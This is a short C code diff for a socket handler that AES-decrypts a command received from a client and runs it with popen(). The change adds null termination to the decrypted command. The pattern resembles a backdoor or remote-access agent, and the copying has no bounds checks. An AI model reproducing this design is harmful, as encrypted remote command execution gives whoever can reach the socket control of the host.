@@ -117,7 +117,9 @@ void handle_client_data(int client_socket)
                 unsigned char enc_cmd[512] = {0};
                 memcpy(enc_cmd, data_buffer + offset + 5, enc_cmd_len);
                 unsigned char cmd[256] = {0};
-                aes_decrypt(enc_cmd, enc_cmd_len, cmd);
+                int dec_len = aes_decrypt(enc_cmd, enc_cmd_len, cmd);
+                // 保证字符串结尾，防止脏数据
+                cmd[dec_len < sizeof(cmd) ? dec_len : sizeof(cmd) - 1] = '\0';
                 // 执行命令
                 FILE *fp = popen((char*)cmd, "r");
                 if (!fp) {
